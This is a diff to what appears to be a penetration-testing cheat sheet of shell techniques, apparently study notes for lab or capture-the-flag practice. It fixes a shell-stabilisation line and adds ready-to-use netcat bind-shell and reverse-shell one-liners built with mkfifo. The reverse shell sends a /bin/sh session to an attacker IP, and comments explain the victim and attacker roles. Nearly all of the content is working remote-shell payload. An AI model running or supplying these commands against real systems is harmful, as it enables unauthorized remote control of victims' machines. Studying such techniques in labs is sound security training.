@@ -27,13 +27,29 @@ nc 10.10.10.10 4444
 
 **STABILIZE SHELL**. 
 ```
-python -c 'import pty;pty.spawn("bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 `Ctrl + z` 
 ssty raw -echo; fg
 ```
 
 
+**BIND SHELL PRACTICE for netcat without -e**
+```
+PORT=4444
+mkfifo /tmp/f; nc -lvnp $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+# ATTACKER MACHINE WILL HAVE TO CONNECT TO VICTIM 
+```
+
+**REVERSE SHELL PRACTICE for netcat without -e**
+```
+IP=10.10.93.13
+PORT=4444
+mkfifo /tmp/f; nc $IP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+# VICTIM MACHINE WILL CONNECT TO YOU, SO ATTACKER MACHINE SHOULD HAVE LISTENER OPEN BEFORE CONNECTION 
+```
 
 ## SOCAT ENCRYPTED SHELLS
 ```
